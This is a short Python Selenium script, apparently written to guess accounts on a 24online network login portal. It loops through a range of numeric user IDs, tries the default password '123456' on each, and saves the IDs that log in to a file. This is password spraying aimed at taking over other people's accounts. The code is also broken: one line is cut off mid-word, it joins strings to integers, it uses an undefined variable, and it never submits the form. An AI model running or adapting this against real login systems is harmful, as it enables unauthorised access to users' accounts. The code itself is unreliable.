from selenium import webdriver
from selenium.webdriver.common.keys import Keys

browser=webdriver.Firefox()
browser.get("http://172.16.16.16/24online/servlet/E24onlineHTTPClient")

username=browser.find_element_by_name("username")
password=browser.find_element_by_name("password")
login=browser.find_eleme

file=open('userid.txt','w')

for i in range(100,200):
    username.send_keys("160905"+i)
    password.send_keys("123456")
    if "You have succesfully logged in" in page.source:
        file.write("160905"+i)
file.close()
browser.close()
